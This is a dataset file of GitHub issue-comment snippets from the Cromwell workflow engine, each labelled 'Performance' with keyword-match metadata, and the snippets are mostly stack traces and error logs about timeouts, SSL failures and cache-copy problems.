org.scalatest.OutcomeOf.outcomeOf$(OutcomeOf.scala:83); at org.scalatest.OutcomeOf$.outcomeOf(OutcomeOf.scala:104); at org.scalatest.Transformer.apply(Transformer.scala:22); at org.scalatest.Transformer.apply(Transformer.scala:20); at org.scalatest.FlatSpecLike$$anon$1.apply(FlatSpecLike.scala:1682); at org.scalatest.TestSuite.withFixture(TestSuite.scala:196); at org.scalatest.TestSuite.withFixture$(TestSuite.scala:195); at cromwell.services.healthmonitor.HealthMonitorServiceActorSpec.withFixture(HealthMonitorServiceActorSp",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:6907,concurren,concurrent,6907,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['concurren'],['concurrent']
Performance,"cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91) ~[cromwell.jar:0.19]; at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. AND 8 instances of these:. ```; 2016-05-03 17:58:04,687 cromwell-system-akka.actor.default-dispatcher-18 INFO - JES Run [UUID(d3ba97c6):ValidateReadGroupSamFile:13]: Status change from Running to Success; 2016-05-03 17:58:04,820 cromwell-system-akka.actor.default-dispatcher-8 WARN - Caught exception, retrying: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reason"" : ""backendError""; } ],; ""message"" : ""Deadline expired before operation could complete."",; ""status"" : ""DEADLINE_EXCEEDED""; }; com.google.api.client.googleapis.json.GoogleJsonResponseException: 504 Gateway Time-out; {; ""code"" : 504,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Deadline expired before operation could complete."",; ""reaso",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:6286,concurren,concurrent,6286,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,"cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend.postProcess(JesBackend.scala:665) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:700) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:6399,concurren,concurrent,6399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['concurren'],['concurrent']
Performance,"ctor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to thi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2688,cache,cache,2688,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,1,['cache'],['cache']
Performance,ctor.declarationValidations(ConfigInitializationActor.scala:41); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder$lzycompute(ConfigInitializationActor.scala:53); at cromwell.backend.impl.sfs.config.ConfigInitializationActor.runtimeAttributesBuilder(ConfigInitializationActor.scala:52); at cromwell.backend.standard.StandardInitializationActor.coerceDefaultRuntimeAttributes(StandardInitializationActor.scala:82); at cromwell.backend.BackendWorkflowInitializationActor.initSequence(BackendWorkflowInitializationActor.scala:155); at cromwell.backend.BackendWorkflowInitializationActor.initSequence$(BackendWorkflowInitializationActor.scala:153); at cromwell.backend.standard.StandardInitializationActor.initSequence(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.$anonfun$applyOrElse$1(BackendWorkflowInitializationActor.scala:146); at cromwell.backend.BackendLifecycleActor.performActionThenRespond(BackendLifecycleActor.scala:44); at cromwell.backend.BackendLifecycleActor.performActionThenRespond$(BackendLifecycleActor.scala:40); at cromwell.backend.standard.StandardInitializationActor.performActionThenRespond(StandardInitializationActor.scala:44); at cromwell.backend.BackendWorkflowInitializationActor$$anonfun$receive$1.applyOrElse(BackendWorkflowInitializationActor.scala:146); at akka.actor.Actor.aroundReceive(Actor.scala:539); at akka.actor.Actor.aroundReceive$(Actor.scala:537); at cromwell.backend.standard.StandardInitializationActor.aroundReceive(StandardInitializationActor.scala:44); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:612); at akka.actor.ActorCell.invoke(ActorCell.scala:581); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); at akka.dispatch.Mailbox.run(Mailbox.scala:229); at akka.dispatch.Mailbox.exec(Mailbox.scala:241); at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runT,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938:5300,perform,performActionThenRespond,5300,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5862#issuecomment-694515938,1,['perform'],['performActionThenRespond']
Performance,ctor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:548); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:538); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseException: 500 Internal Server Error; Backend Error; 	at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:146); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest$1.interceptResponse(AbstractGoogleClientRequest.java:321); 	at com.google.api.client.http.HttpRequest.execute(HttpRequest.java:1065); 	at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762:2903,concurren,concurrent,2903,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762,1,['concurren'],['concurrent']
Performance,"cute(HttpRequest.java:972); at com.google.api.client.googleapis.batch.BatchRequest.execute(BatchRequest.java:241); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.runBatch(JesPollingActor.scala:67); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.cromwell$backend$impl$jes$statuspolling$JesPollingActor$$handleBatch(JesPollingActor.scala:58); at cromwell.backend.impl.jes.statuspolling.JesPollingActor$$anonfun$receive$1.applyOrElse(JesPollingActor.scala:36); at akka.actor.Actor$class.aroundReceive(Actor.scala:484); at cromwell.backend.impl.jes.statuspolling.JesPollingActor.aroundReceive(JesPollingActor.scala:22); at akka.actor.ActorCell.receiveMessage(ActorCell.scala:526); at akka.actor.ActorCell.invoke(ActorCell.scala:495); at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:257); at akka.dispatch.Mailbox.run(Mailbox.scala:224); at akka.dispatch.Mailbox.exec(Mailbox.scala:234); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-28 14:37:35,25] [error] The JES polling actor Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c/$a/$a#551868791] unexpectedly terminated while conducting 5 polls. Making a new one...; [2016-10-28 14:37:35,25] [info] watching Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/$c/$a/$b#797880880]; [2016-10-28 14:37:35,25] [warn] JesAsyncBackendJobExecutionActor [a3dd8163case_gatk_acnv_workflow.CNLoHAndSplitsCaller:1:1]: Caught exception, retrying:; java.lang.RuntimeException: Unexpected actor death!; at cromwell.backend.impl.jes.statuspolling.JesPollingActorClient$$anonfun$pollingActorClientReceive$1.applyOrElse(JesPollingActorClient.scala:33); at scala.PartialFunction$OrElse.applyOrElse(PartialFunction.scala:170); at akka.actor",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948:4317,concurren,concurrent,4317,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631#issuecomment-256938948,1,['concurren'],['concurrent']
Performance,"d to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Falling back to running job. As you can see, some small tasks worked but large tasks failed. > Hi, In Cromwell 52 we updated the S3 module to perform multithreaded, multipart copies to improve the size of results that may be cached. There are also additional improvements that have recently been merged into dev and should appear in the next release version (or you could build from source) v52+ requires a new AWS configuration. Instructions are in https://aws-genomics-workflows.s3.amazonaws.com/Installing+the+Genomics+Workflow+Core+and+Cromwell.pdf; > […](#); > On Sat, Oct 24, 2020 at 8:27 PM Luyu ***@***.***> wrote: Hi, I got a timeout exception during cache copying on AWS S3. The cache file size is 133GB. Given the file size, more time should be allowed for cache copying. Is there any config option that can tune this? Thank you in advance for any suggestions. Backend: AWS Batch Cromwell version: 51 Error log: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_PreProcessingForVariantDiscovery_GATK4.SamTo FastqAndBwaMem:0:1 (TimeoutException: The Cache hit copying actor timed out waiting for a response to copy s3://xxxxx/cromwell-execution/Germ line_Somatic_Calling/441619a4-7ca8-490b-bd04-2f9981d3db0f/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/95aed08f-3045-45e4-94c9-ba0230851136 /call-SamToFastqAndBwaMem/shard-0/39T_R.unmerged.bam to s3://xxxxx/cromwell-execution/Germline_Somatic_Calling/c25a8561-808f-4b46-9bd2-ef0488 8c0031/call-Tumor_Bam/PreProcessingForVariantDiscovery_GATK4/8df24f46-2f4f-4557-a662-d630ac443736/call-SamToFastqAndBwaMem/shard-0/cacheCopy/39T_R.u nmerged.bam) — You are receiving this because you are subscribed to this thread. Reply to this email directly, view it on GitHub <#5977>, or unsubscribe <https://github.com/notifications/unsubscribe-auth/AF2E6EMWLDPLNV7UM35OWWLSMNWFNANCNFSM4S56ELLQ> .",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:2938,cache,cache,2938,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,3,"['Cache', 'cache']","['Cache', 'cache', 'cacheCopy']"
Performance,d.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$1.apply(JesAsyncBackendJobExecutionActor.scala:110); 	at scala.util.Try$.apply(Try.scala:192); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents$lzycompute(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.cromwell$backend$impl$jes$JesAsyncBackendJobExecutionActor$$returnCodeContents(JesAsyncBackendJobExecutionActor.scala:110); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:548); 	at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$$anonfun$executionResult$1.apply(JesAsyncBackendJobExecutionActor.scala:538); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24); 	at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: com.google.api.client.googleapis.json.GoogleJsonResponseException: 500 Internal Server Error; Backend Error; 	at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:146); 	at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); 	at com.google.api.client.googleapis.services.json.AbstractGoog,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762:2495,concurren,concurrent,2495,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1782#issuecomment-267025762,1,['concurren'],['concurrent']
Performance,"d.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:705) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:700) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) ~[cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; Caused by: java.io.EOFException: SSL peer shut down incorrectly; at sun.security.ssl.InputRecord.read(InputRecord.java:505) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.readRecord(SSLSocketImpl.java:973) ~[na:1.8.0_72]; ... 54 common frames omitted; ```. and. ```; 2016-08-03 03:33:06,985 cromwell-system-akka.actor.default-dispatcher-3 WARN - Caught exception, retrying: Broken pipe; java.net.SocketException: Broken pipe; at java.net.SocketOutputStream.socketWrite0(Native Method) ~[na:1.8.0_72]; at java.net.SocketOutputStream.socketWrite(SocketOutputStream.java:109) ~[na:1.8.0_72]; at java.net.SocketOutputStream.write(SocketOutputStream.java:153) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.writeBuffer(OutputRecord.java:431) ~[na:1.8.0_72]; at sun.security.ssl.OutputRecord.write(OutputRecord.java:417) ~[na:1.8.0_72]; at sun.security.ssl.SSLSocketImpl.writeRecordInternal(SSLSocketImpl.java:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:6601,concurren,concurrent,6601,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['concurren'],['concurrent']
Performance,d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589855:java.lang.Throwable: Task 129f0510-5d6b-4c4c-b266-116a9a52f325:CollectQualityYieldMetrics failed: error code 10. Message: 13: VM ggp-12606127296447203756 shut down unexpectedly.; 3589856- at cromwell.engine.backend.jes.JesBackend.cromwell$engine$backend$jes$JesBackend$$handleFailure(JesBackend.scala:774) ~[cromwell.jar:0.19]; 3589857- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:685) ~[cromwell.jar:0.19]; 3589858- at cromwell.engine.backend.jes.JesBackend$$anonfun$executionResult$1.apply(JesBackend.scala:659) ~[cromwell.jar:0.19]; 3589859- at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) ~[cromwell.jar:0.19]; 3589860- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run_aroundBody0(Future.scala:24) ~[cromwell.jar:0.19]; 3589861- at scala.concurrent.impl.Future$PromiseCompletingRunnable$AjcClosure1.run(Future.scala:1) ~[cromwell.jar:0.19]; 3589862- at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; 3589863- at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; 3589864- at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; 3589865- at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; 3589866- at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:23) ~[cromwell.jar:0.19]; 3589867- at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) ~[cromwell.jar:0.19]; 3589868- at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; 3589869- at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862:3272,concurren,concurrent,3272,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/744#issuecomment-215222862,1,['concurren'],['concurrent']
Performance,"dc4c1912c1416225c79d298f76#diff-39fe7186c2383fc1135f29a9c05e4e57) but I don't; grasp the scope of the change enough to know if this triggers it. In our CWL run, the jobs get submitted to the cluster and run okay based on the; work directories in `cromwell-execution` but the polling dies with:; ```; [2019-01-17 12:34:15,18] [info] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Status change from - to Running; [2019-01-17 12:34:16,27] [ESC[38;5;220mwarnESC[0m] DispatchedConfigAsyncJobExecutionActor [ESC[38;5;2mf2e0c573ESC[0malignment_to_rec:NA:1]: Fatal exception polling for status. Job will fail.; java.util.concurrent.ExecutionException: Boxed Error; at scala.concurrent.impl.Promise$.resolver(Promise.scala:83); at scala.concurrent.impl.Promise$.scala$concurrent$impl$Promise$$resolveTry(Promise.scala:75); at scala.concurrent.impl.Promise$KeptPromise$.apply(Promise.scala:402); at scala.concurrent.Promise$.fromTry(Promise.scala:138); at scala.concurrent.Future$.fromTry(Future.scala:635); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync(StandardAsyncExecutionActor.scala:691); at cromwell.backend.standard.StandardAsyncExecutionActor.pollStatusAsync$(StandardAsyncExecutionActor.scala:691); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.pollStatusAsync(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.standard.StandardAsyncExecutionActor.poll(StandardAsyncExecutionActor.scala:983); at cromwell.backend.standard.StandardAsyncExecutionActor.poll$(StandardAsyncExecutionActor.scala:977); at cromwell.backend.impl.sfs.config.DispatchedConfigAsyncJobExecutionActor.poll(ConfigAsyncJobExecutionActor.scala:211); at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustPoll$1(AsyncBackendJobExecutionActor.scala:76); at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.sca",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345:1516,concurren,concurrent,1516,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4560#issuecomment-455621345,1,['concurren'],['concurrent']
Performance,de was 1; 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handleExecutionResult(StandardAsyncExecutionActor.scala:432); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handleExecutionResult(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$class.handlePollSuccess(StandardAsyncExecutionActor.scala:370); 	at cromwell.backend.impl.sfs.config.BackgroundConfigAsyncJobExecutionActor.handlePollSuccess(ConfigAsyncJobExecutionActor.scala:113); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:333); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$poll$2.apply(StandardAsyncExecutionActor.scala:332); 	at scala.util.Success$$anonfun$map$1.apply(Try.scala:237); 	at scala.util.Try$.apply(Try.scala:192); 	at scala.util.Success.map(Try.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:6016,concurren,concurrent,6016,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,1,['concurren'],['concurrent']
